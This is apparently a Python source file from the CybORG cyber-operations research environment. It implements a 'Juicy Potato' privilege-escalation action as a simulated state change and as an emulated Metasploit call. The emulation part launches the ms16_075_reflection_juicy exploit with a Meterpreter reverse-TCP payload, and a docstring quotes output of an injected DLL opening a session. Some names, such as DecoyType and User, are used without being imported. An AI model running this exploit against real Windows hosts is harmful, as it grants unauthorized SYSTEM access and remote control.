## The following code contains work of the United States Government and is not subject to domestic copyright protection under 17 USC § 105.
## Additionally, we waive copyright and related rights in the utilized code worldwide through the CC0 1.0 Universal public domain dedication.

"""
pertaining to the Juicy Potato permissions escalation action
"""
# pylint: disable=invalid-name
from typing import Tuple
from ipaddress import IPv4Address
from random import randint

from CybORG.Shared import Observation
from CybORG.Shared.Actions.MSFActionsFolder.MSFPrivilegeEscalationFolder.MSFPrivilegeEscalation import MSFPrivilegeEscalation
from CybORG.Shared.Enums import OperatingSystemType, SessionType
from CybORG.Simulator.Host import Host
from CybORG.Simulator.Process import Process
from CybORG.Simulator.State import State


class MSFJuicyPotato(MSFPrivilegeEscalation):
    """
    Implements the Juicy Potato permissions escalation action
    Removes target session as Action parameters
    """
    def __init__(self, session: int, agent: str, ip_address: IPv4Address):
        super().__init__(session, agent)
        self.ip_address = ip_address

    def sim_execute(self, state: State) -> Observation:

        obs = Observation()
        # get details of the server session
        server_sessions = [ s for s in state.sessions[self.agent] if s.session_type == SessionType.MSF_SERVER ]
        if len(server_sessions) == 0:
            # no server session found
            return Observation(success=False)

        # choose first session
        session = server_sessions[0]

        # find shared subnet of the two hosts
        server_session, server_interface = self.get_local_source_interface(local_session=session, remote_address=self.ip_address, state=state)

        if server_interface is None:
            return Observation(success=False)

        server_address = server_interface.ip_address
       
        hostname = state.ip_addresses[self.ip_address]
        target_sessions = [ s for s in state.sessions[self.agent] if s.ip_addr == self.ip_address ]
        print("sessions on the target host")
        print(target_sessions)
        if len(target_sessions) == 0:
            # no valid session could be found on chosen host
            return Observation(success=False)

        # find if any existing sessions are already priv
        priv_host_sessions = [s for s in target_sessions if s.username in ('root','SYSTEM') ]
        if len(priv_host_sessions) > 0:
          # return first session
          print("found existing priv session")
          sess = priv_host_sessions[0]
          obs.set_success(True)
          print(sess.pid)
          # should we also return the process information of this existing session??
          obs.add_session_info(hostid=hostname, **sess.get_state())
          return obs

        if len(target_sessions) > 1:
            print("more than one nonpriv sesssion on host.  choosing the first")
        target_host_session = target_sessions[0]

        # what is the effect of the escalate sandbox?
        if target_host_session.is_escalate_sandbox:
               state.remove_process(target_host_session.host, target_host_session.pid)
               return Observation(success=False), -1

        #else:
        #       obs=self.sim_escalate(state, hostname, sess, "root")
        #       # privesc requries existing nonpriv session
        #       # nonpriv session details
        #       #print(target_host_session)

        # sim_escalate functionality here
        # target_hostname=hostname
        target_host = state.hosts[target_host_session.host]
        is_compatible, necessary_processes = self.test_exploit_works(target_host)
        if not is_compatible:
            obs.set_success(False)
            return obs

        for proc in necessary_processes:
            if proc.decoy_type & DecoyType.ESCALATE:
                obs.set_success(False)
                return obs

        if target_host.os_type == OperatingSystemType.WINDOWS:

            root_user: User = None
            for u in target_host.users:
                if u.username == "SYSTEM":
                    root_user = u

            if root_user is None:
                # for the moment, lets fail the exploit if SYSTEM user is not on target host
                # does this exploit work if SYSTEM user is not present??
                obs.set_success(False)
                return obs

        else:
            # not a windows OS
            obs.set_success(False)
            return obs
        # process is escalatable on the host
        # at the moment, this also works even if there are no necessary processes return
        # in the test_exploit_works function.
        #

        # Simulator State Changes
        # create process on the target state for the meterpreter client
        target_process = target_host.add_process(name="bash", ppid=1, path="/usr/bin/", user=root_user)


        # adds session to target host on the Simulator State
        # this adds the session.pid
        # is server_session the correct value for the parent on the target host?
        new_session = state.add_session(host=target_host.hostname, agent=self.agent, process=target_process.pid,
                                                user=root_user.username, session_type="meterpreter", parent=server_session)

        local_port = target_host.get_ephemeral_port()
        lport = randint(4400,45000)
        new_connection = {"remote_port": local_port,
                                  "Application Protocol": "tcp",
                                  "remote_address": server_address,
                                  "local_port": lport,
                                  "local_address": str(self.ip_address)
                                  }
        state.hosts[new_session.host].get_process(new_session.pid).connections.append(new_connection)
        remote_port = {"remote_port": lport,
                               "Application Protocol": "tcp",
                               "local_address": server_address,
                               "remote_address": str(self.ip_address),
                               "local_port": local_port
                               }

        # adds connection to the target host 2on the server session
        state.hosts[server_session.host].get_process(server_session.pid).connections.append(remote_port)

        # unknown why this is required
        #if session != server_session:
        #            local_port = None

        obs.add_process(hostid=hostname, local_address=str(self.ip_address), local_port=local_port, remote_address=server_address, remote_port=4445)
        # disable server process obs for the moment
        #obs.add_process(hostid=server_session.host, local_address=str(server_address), local_port=4445, remote_address=str(self.ip_address), remote_port=local_port)
        obs.add_session_info(hostid=hostname, username=new_session.username, session_id=new_session.ident, session_type=new_session.session_type, agent=self.agent)

        return obs


    def emu_execute(self, session_handler) -> Observation:
        obs = Observation()
        from CybORG.Emulator.Session import MSFSessionHandler
        if type(session_handler) is not MSFSessionHandler:
            obs.set_success(False)
            return obs

        sessions = session_handler.get_session_by_remote_ip(str(self.ip_address), session_type="meterpreter")
        print(sessions)
        if len(sessions) == 0:
            obs.set_success(False)
            return obs
        session = list(sessions.keys())[0]
        # get LHOST from the session tunnel_local
        #print("target session {}".format(sessions[session]))
        lhost = self.get_lhost(sessions[session]["tunnel_local"])
        lport = randint(4400,4500)

        output = session_handler.execute_module(mtype='exploit', mname='windows/local/ms16_075_reflection_juicy', opts={'RHOSTS': str(self.ip_address), 'SESSION': session}, payload_name='windows/x64/meterpreter/reverse_tcp', payload_opts={'LHOST': lhost, 'LPORT': lport})
        obs.add_raw_obs(output)
        obs.set_success(False)
        session_handler._log_debug(output)
        session = None
        """
        [*] Started reverse TCP handler on 0.0.0.0:4445
        [+] Target appears to be vulnerable (Windows 2008 R2 Service Pack 1)
        [*] Launching notepad to host the exploit...
        [+] Process 1780 launched.
        [*] Reflectively injecting the exploit DLL into 1780...
        [*] Injecting exploit into 1780...
        [*] Exploit injected. Injecting exploit configuration into 1780...
        [*] Configuration injected. Executing exploit...
        [+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
        [*] Sending stage (200774 bytes) to 10.46.64.100
        [*] Meterpreter session 5 opened (10.46.64.10:4445 -> 10.46.64.100:49163) at 2024-02-05 04:48:28 +0000
        [*] Backgrounding session 5...
        """
        for line in output.split('\n'):
          #print(line)
          if '[*] Meterpreter session' in line:
              obs.set_success(True)
              #print(list(enumerate(line.split(' '))))
              split = line.split(' ')
              session = int(split[3])
              if '-' in split[5]:
                  temp = split[5].replace('(', '').split(':')[0]
                  origin, rip = temp.split('-')
                  # obs.add_process(remote_address=rip, local_address=origin)
                  rport = None
              else:
                  rip, rport = split[5].replace('(', '').split(':')
              lip, lport = split[7].replace(')', '').split(':')
              obs.add_process(hostid=str(self.ip_address), local_address=lip, local_port=lport, remote_address=rip, remote_port=rport)
        if session == None:
            obs = Observation()
            obs.set_success(False)
            return obs
        # get user id of session
        #print("get user from session")
        user = session_handler.get_session_user(session)
        #print(user)
        if user is None:
          obs = Observation()
          obs.set_success(False)
        else:
          obs.add_session_info(hostid=str(self.ip_address), username=user, session_id=session, session_type='meterpreter', agent=self.agent)
        return obs

    def test_exploit_works(self, target_host: Host) ->\
            Tuple[bool, Tuple[Process, ...]]:
        # the exact patches and OS distributions are described here:
        # returns an empty list of escalatable processes
        return target_host.os_type == OperatingSystemType.WINDOWS, ()

    def __str__(self):
        return f"{self.__class__.__name__} Target: {self.ip_address}"

